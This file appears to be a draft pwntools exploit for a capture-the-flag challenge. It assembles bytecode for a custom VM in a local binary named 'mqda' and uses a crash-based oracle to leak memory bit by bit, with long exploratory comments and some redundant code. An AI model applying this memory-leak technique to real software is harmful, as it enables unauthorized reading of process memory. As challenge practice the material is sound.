#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

# VM instruction encoders
def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    """Opcode 12, mode 2: reg >>= imm32"""
    return bytes([0x4c, reg]) + p32(imm32)

def xor_reg_imm(reg, imm32):
    """Opcode 9, mode 2: reg ^= imm32"""
    return bytes([0x49, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_code(read_addr, bit_position, expected_bit):
    """
    Test if bit at position equals expected_bit.
    Without AND, we use:
    1. Shift right by bit_position
    2. XOR with 0xFFFFFFFE to flip all bits except bit 0
    3. This gives: 0xFFFFFFFF if original bit 0 was 1, 0xFFFFFFFE if it was 0
    
    Actually simpler: just shift and compare with specific values
    If original bit was 1: after shift, bit 0 is 1, value is odd
    If original bit was 0: after shift, bit 0 is 0, value is even
    
    But we need to isolate bit 0 somehow...
    
    Alternative: use SHR by 31 to isolate MSB, then SHL by 31 and SHR by 31...
    
    Even simpler: shift by (31 - bit_position) to put target bit in position 31,
    then shift by 31 to isolate it.
    """
    code = b''
    
    # Set SP to read_addr
    code += mov_reg_imm(15, read_addr)
    
    # Pop value into r0
    code += pop_reg(0)
    
    # Shift left to put target bit in MSB position
    # But we don't have SHL with immediate... check opcodes
    # Actually opcode 11 (SHL) needs immediate in register
    
    # Alternative: multiple shifts
    # SHR by bit_position puts target bit in position 0
    # Then XOR with 1 to test: result is 0 if bit was 1, 1 if bit was 0
    
    if bit_position > 0:
        code += shr_reg_imm(0, bit_position)
    
    # XOR with 1: if bit was 1, r0 becomes even; if bit was 0, r0 becomes odd
    # Wait, that's not quite right. Let me think...
    
    # After SHR, r0 has original bits [31..bit_position] in positions [31-bit_position..0]
    # The target bit is now in position 0
    
    # If we XOR with expected_bit:
    # - If target bit == expected: result bit 0 is 0
    # - If target bit != expected: result bit 0 is 1
    
    # But we can't easily check if bit 0 is 0 or 1 without AND...
    
    # Another approach: SHR by 31 to keep only MSB
    # First SHL by (31 - bit_position) to move target bit to MSB
    # But we don't have SHL with immediate in mode 2...
    
    # Let me check SHL encoding:
    # Opcode 11 mode 2 uses the immediate as shift count
    
    # Actually looking at the code again:
    # 0x00001ed1: mov ecx, dword [var_2h]  <- shift count from immediate
    # 0x00001ed5: shl dword [rbp + rax*4 + 0x10], cl
    # So SHL mode 2 does work with immediate!
    
    # shl_reg_imm = [0x4b, reg] + imm32
    # 0x4b = 0x40 (mode 2) | 0x0b (opcode 11)
    
    code = b''
    code += mov_reg_imm(15, read_addr)
    code += pop_reg(0)
    
    # Shift left to move target bit to MSB (position 31)
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += bytes([0x4b, 0]) + p32(shl_amount)  # shl r0, shl_amount
    
    # Shift right by 31 to isolate the MSB (now in position 0)
    code += shr_reg_imm(0, 31)
    
    # Now r0 is 0 or 1
    # Compare with expected_bit
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    # Jump to HLT if equal
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(read_addr, bit_position):
    """Test if bit at position is 1. Returns True if 1, False if 0."""
    code = create_bit_test_code(read_addr, bit_position, 1)
    
    p = process(['./mqda'], level='error')
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_dword(read_addr):
    """Leak a 32-bit value using bit-by-bit oracle."""
    val = 0
    for bit in range(32):
        if test_bit(read_addr, bit):
            val |= (1 << bit)
    return val

def main():
    print("[*] Testing bit isolation with SHL+SHR...")
    
    # Test: leak first dword of our code (should be 0x00000f41)
    # But the code changes based on read_addr and bit_position!
    
    # Let me first verify with a known position
    # read_addr=0, bit_position=0: reads code[0..3], tests bit 0
    # code[0] = 0x41 (mov opcode), bit 0 is 1
    
    print("[*] Testing bit 0 of code at address 0...")
    result = test_bit(0, 0)
    print(f"[*] Bit 0 = {1 if result else 0}")
    
    # bit 8 of code[0..3] is bit 0 of code[1]
    # code[1] = 0x0f (register 15), bit 0 is 1
    print("[*] Testing bit 8...")
    result = test_bit(0, 8)
    print(f"[*] Bit 8 = {1 if result else 0}")
    
    # Let's manually verify what the code reads
    code = create_bit_test_code(0, 0, 1)
    first_dword = u32(code[0:4])
    print(f"[*] Code first dword: 0x{first_dword:08x}, bit 0 = {first_dword & 1}")

if __name__ == '__main__':
    main()

def leak_and_verify():
    """Leak first dword and verify."""
    print("[*] Leaking first dword at address 0...")
    
    leaked = 0
    for bit in range(32):
        sys.stdout.write(f"\r[*] Bit {bit}/32...")
        sys.stdout.flush()
        if test_bit(0, bit):
            leaked |= (1 << bit)
    
    print(f"\n[+] Leaked value: 0x{leaked:08x}")
    
    # Verify - the first dword should be 0x00000f41 (mov r15, 0)
    # But wait, we're reading with read_addr=0, so code starts with mov r15, 0
    # code[0:4] = [0x41, 0x0f, 0x00, 0x00] = 0x00000f41
    expected = 0x00000f41
    print(f"[*] Expected: 0x{expected:08x}")
    
    if leaked == expected:
        print("[+] SUCCESS! Bit leak works!")
        return True
    else:
        print("[-] Mismatch - debugging needed")
        return False

if __name__ == '__main__':
    leak_and_verify()
